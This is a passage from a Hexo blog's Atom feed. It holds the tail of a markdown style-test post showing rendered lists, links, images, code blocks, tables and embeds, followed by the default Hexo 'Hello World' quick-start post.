class="line">Common Paragraph with some text.</span><br><span class="line">And more text.</span><br></pre></td></tr></table></figure><ol><li>First ordered list item</li><li>Another item</li></ol><ul><li>Unordered sub-list.</li></ul><ol><li><p>Actual numbers don’t matter, just that it’s a number</p></li><li><p>Ordered sub-list</p></li><li><p>And another item.</p><p>You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we’ll use three here to also align the raw Markdown).</p><p>To have a line break without a paragraph, you will need to use two trailing spaces.<br>Note that this line is separate, but within the same paragraph.<br>(This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)</p></li></ol><ul><li>Unordered list can use asterisks</li></ul><ul><li>Or minuses</li></ul><ul><li>Or pluses</li></ul><ul><li><p>Paragraph In unordered list</p><p>For example like this.</p></li></ul><p>Common Paragraph with some text.<br>And more text.</p><h2 id="Inline-HTML"><a href="#Inline-HTML" class="headerlink" title="Inline HTML"></a>Inline HTML</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span>To reboot your computer, press <span class="xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>ctrl<span class="xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>alt<span class="xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>+<span class="xml"><span class="tag">&lt;<span class="name">kbd</span>&gt;</span></span>del<span class="xml"><span class="tag">&lt;/<span class="name">kbd</span>&gt;</span></span>.<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>To reboot your computer, press <kbd>ctrl</kbd>+<kbd>alt</kbd>+<kbd>del</kbd>.</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span></span><br><span class="line"><span class="code">    &lt;dt&gt;Definition list&lt;/dt&gt;</span></span><br><span class="line"><span class="code">    &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    &lt;dt&gt;Markdown in HTML&lt;/dt&gt;</span></span><br><span class="line"><span class="code">    &lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;</span></span><br><span class="line"><span class="code">&lt;/dl&gt;</span></span><br></pre></td></tr></table></figure><dl>    <dt>Definition list</dt>    <dd>Is something people use sometimes.</dd><pre><code>&lt;dt&gt;Markdown in HTML&lt;/dt&gt;&lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;</code></pre></dl><h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">I&#x27;m an inline-style link</span>](<span class="link">https://www.google.com</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">I&#x27;m an inline-style link with title</span>](<span class="link">https://www.google.com &quot;Google&#x27;s Homepage&quot;</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">I&#x27;m a reference-style link</span>][<span class="symbol">Arbitrary case-insensitive reference text</span>]</span><br><span class="line"></span><br><span class="line">[<span class="string">I&#x27;m a relative reference to a repository file</span>](<span class="link">../blob/master/LICENSE</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">You can use numbers for reference-style link definitions</span>][<span class="symbol">1</span>]</span><br><span class="line"></span><br><span class="line">Or leave it empty and use the [link text itself]</span><br><span class="line"></span><br><span class="line">Some text to show that the reference links can follow later.</span><br><span class="line"></span><br><span class="line">[<span class="symbol">arbitrary case-insensitive reference text</span>]: <span class="link">https://hexo.io</span></span><br><span class="line">[<span class="symbol">1</span>]: <span class="link">https://hexo.io/docs/</span></span><br><span class="line">[<span class="symbol">link text itself</span>]: <span class="link">https://hexo.io/api/</span></span><br></pre></td></tr></table></figure><p><a href="https://www.google.com/">I’m an inline-style link</a></p><p><a href="https://www.google.com/" title="Google&#39;s Homepage">I’m an inline-style link with title</a></p><p><a href="https://hexo.io/">I’m a reference-style link</a></p><p><a href="../blob/master/LICENSE">I’m a relative reference to a repository file</a></p><p><a href="https://hexo.io/docs/">You can use numbers for reference-style link definitions</a></p><p>Or leave it empty and use the <a href="https://hexo.io/api/">link text itself</a></p><p>Some text to show that the reference links can follow later.</p><h2 id="Images"><a href="#Images" class="headerlink" title="Images"></a>Images</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hover to see the title text:</span><br><span class="line"></span><br><span class="line">Inline-style:</span><br><span class="line"></span><br><span class="line">![<span class="string">alt text</span>](<span class="link">https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 1&quot;</span>)</span><br><span class="line"></span><br><span class="line">Reference-style:</span><br><span class="line">![<span class="string">alt text</span>][<span class="symbol">logo</span>]</span><br><span class="line"></span><br><span class="line">[<span class="symbol">logo</span>]: <span class="link">https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 2&quot;</span></span><br></pre></td></tr></table></figure><p>hover to see the title text:</p><p>Inline-style:</p><p><img src="https://hexo.io/icon/favicon-196x196.png" class="lazyload" data-srcset="https://hexo.io/icon/favicon-196x196.png" srcset="data:image/png;base64,666" alt="alt text" title="Logo Title Text 1"></p><p>Reference-style:<br><img src="https://hexo.io/icon/favicon-196x196.png" class="lazyload" data-srcset="https://hexo.io/icon/favicon-196x196.png" srcset="data:image/png;base64,666" alt="alt text" title="Logo Title Text 2"></p><h2 id="Code-and-Syntax-Highlighting"><a href="#Code-and-Syntax-Highlighting" class="headerlink" title="Code and Syntax Highlighting"></a>Code and Syntax Highlighting</h2><p>Inline <code>code</code> has <code>back-ticks around</code> it.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;JavaScript syntax highlighting&quot;</span>;</span><br><span class="line">alert(s);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;Python syntax highlighting&quot;</span></span><br><span class="line"><span class="built_in">print</span> s</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">No language indicated, so no syntax highlighting.</span><br><span class="line">But let&#39;s throw in a &lt;b&gt;tag&lt;&#x2F;b&gt;.</span><br></pre></td></tr></table></figure><h2 id="Tables"><a href="#Tables" class="headerlink" title="Tables"></a>Tables</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|                |ASCII                          |HTML                         |</span><br><span class="line">|----------------|-------------------------------|-----------------------------|</span><br><span class="line">|Single backticks|<span class="code">`&#x27;Isn&#x27;t this fun?&#x27;`</span>            |&#x27;Isn&#x27;t this fun?&#x27;            |</span><br><span class="line">|Quotes          |<span class="code">`&quot;Isn&#x27;t this fun?&quot;`</span>            |&quot;Isn&#x27;t this fun?&quot;            |</span><br><span class="line">|Dashes          |<span class="code">`-- is en-dash, --- is em-dash`</span>|-- is en-dash, --- is em-dash|</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>ASCII</th><th>HTML</th></tr></thead><tbody><tr><td>Single backticks</td><td><code>&#39;Isn&#39;t this fun?&#39;</code></td><td>‘Isn’t this fun?’</td></tr><tr><td>Quotes</td><td><code>&quot;Isn&#39;t this fun?&quot;</code></td><td>“Isn’t this fun?”</td></tr><tr><td>Dashes</td><td><code>-- is en-dash, --- is em-dash</code></td><td>– is en-dash, — is em-dash</td></tr></tbody></table><p>Colons can be used to align columns.</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| Tables        | Are           | Cool  |</span><br><span class="line">| ------------- |:-------------:| -----:|</span><br><span class="line">| col 3 is      | right-aligned |  |</span><br><span class="line">| col 2 is      | centered      |    |</span><br><span class="line">| zebra stripes | are neat      |   </span><br></pre></td></tr></table></figure><table><thead><tr><th>Tables</th><th align="center">Are</th><th align="right">Cool</th></tr></thead><tbody><tr><td>col 3 is</td><td align="center">right-aligned</td><td align="right"></td></tr><tr><td>col 2 is</td><td align="center">centered</td><td align="right"></td></tr><tr><td>zebra stripes</td><td align="center">are neat</td><td align="right"></td></tr></tbody></table><p>The outer pipes (|) are optional, and you don’t need to make the raw Markdown line up prettily. You can also use inline Markdown.</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Markdown | Less | Pretty</span><br><span class="line">--- | --- | ---</span><br><span class="line"><span class="emphasis">*Still*</span> | <span class="code">`renders`</span> | <span class="strong">**nicely**</span></span><br><span class="line">1 | 2 | 3</span><br></pre></td></tr></table></figure><table><thead><tr><th>Markdown</th><th>Less</th><th>Pretty</th></tr></thead><tbody><tr><td><em>Still</em></td><td><code>renders</code></td><td><strong>nicely</strong></td></tr><tr><td>1</td><td>2</td><td>3</td></tr></tbody></table><blockquote><p>You can find more information about <strong>LaTeX</strong> mathematical expressions <a href="https://math.meta.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">here</a>.</p></blockquote><h2 id="Blockquotes"><a href="#Blockquotes" class="headerlink" title="Blockquotes"></a>Blockquotes</h2><blockquote><p>Blockquotes are very handy in email to emulate reply text.<br>This line is part of the same quote.</p></blockquote><p>Quote break.</p><blockquote><p>This is a very long line that will still be quoted properly when it wraps. Oh boy let’s keep writing to make sure this is long enough to actually wrap for everyone. Oh, you can <em>put</em> <strong>Markdown</strong> into a blockquote.</p></blockquote><h2 id="Horizontal-Rule"><a href="#Horizontal-Rule" class="headerlink" title="Horizontal Rule"></a>Horizontal Rule</h2><p>Three or more…</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"></span><br><span class="line">Hyphens</span><br><span class="line"></span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis">Asterisks</span></span></span><br><span class="line"><span class="strong"><span class="emphasis"></span></span></span><br><span class="line"><span class="strong"><span class="emphasis"><span class="strong">__<span class="emphasis">_</span></span></span></span></span><br><span class="line"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"></span></span></span></span></span><br><span class="line"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">Underscores</span></span></span></span></span><br></pre></td></tr></table></figure><hr><p>Hyphens</p><hr><p>Asterisks</p><hr><p>Underscores</p><h2 id="Line-Breaks"><a href="#Line-Breaks" class="headerlink" title="Line Breaks"></a>Line Breaks</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Here&#x27;s a line for us to start with.</span><br><span class="line"></span><br><span class="line">This line is separated from the one above by two newlines, so it will be a <span class="emphasis">*separate paragraph*</span>.</span><br><span class="line"></span><br><span class="line">This line is also a separate paragraph, but...</span><br><span class="line">This line is only separated by a single newline, so it&#x27;s a separate line in the <span class="emphasis">*same paragraph*</span>.</span><br></pre></td></tr></table></figure><p>Here’s a line for us to start with.</p><p>This line is separated from the one above by two newlines, so it will be a <em>separate paragraph</em>.</p><p>This line is also a separate paragraph, but…<br>This line is only separated by a single newline, so it’s a separate line in the <em>same paragraph</em>.</p><hr><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">This is a regular paragraph.</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="code">    &lt;tr&gt;</span></span><br><span class="line"><span class="code">        &lt;td&gt;Foo&lt;/td&gt;</span></span><br><span class="line"><span class="code">    &lt;/tr&gt;</span></span><br><span class="line"><span class="code">&lt;/table&gt;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">This is another regular paragraph.</span></span><br></pre></td></tr></table></figure><p>This is a regular paragraph.</p><table>    <tr>        <td>Foo</td>    </tr></table><p>This is another regular paragraph.</p><h2 id="Youtube-videos"><a href="#Youtube-videos" class="headerlink" title="Youtube videos"></a>Youtube videos</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.youtube.com/watch?feature=player_embedded&amp;v=ARted4RniaU</span></span></span></span><br><span class="line"><span class="xml">&quot; target=&quot;_blank&quot;&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.youtube.com/vi/ARted4RniaU/0.jpg&quot;</span></span></span></span><br><span class="line"><span class="xml">alt=&quot;IMAGE ALT TEXT HERE&quot; width=&quot;240&quot; height=&quot;180&quot; border=&quot;10&quot; /&gt;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">Pure markdown version:</span><br><span class="line"></span><br><span class="line">[<span class="string">![IMAGE ALT TEXT HERE</span>](<span class="link">https://img.youtube.com/vi/ARted4RniaU/0.jpg</span>)](<span class="link">https://www.youtube.com/watch?v=ARted4RniaU</span>)</span><br></pre></td></tr></table></figure><p><a href="https://www.youtube.com/watch?feature=player_embedded&v=ARted4RniaU" target="_blank"><img src="https://img.youtube.com/vi/ARted4RniaU/0.jpg"alt="IMAGE ALT TEXT HERE" width="240" height="180" border="10" /></a></p><p>Pure markdown version:</p><p><a href="https://www.youtube.com/watch?v=ARted4RniaU"><img src="https://img.youtube.com/vi/ARted4RniaU/0.jpg" class="lazyload" data-srcset="https://img.youtube.com/vi/ARted4RniaU/0.jpg" srcset="data:image/png;base64,666" alt="IMAGE ALT TEXT HERE"></a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;This post is originated from &lt;a href=&quot;https://gist.github.com/apackeer/4159268&quot;&gt;here&lt;/a&gt; and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://canc3s.github.io/2018/01/01/hello-world/"/>
    <id>https://canc3s.github.io/2018/01/01/hello-world/</id>
    <published>2018-01-01T15:30:04.000Z</published>
    <updated>2021-01-30T15:08:07.529Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
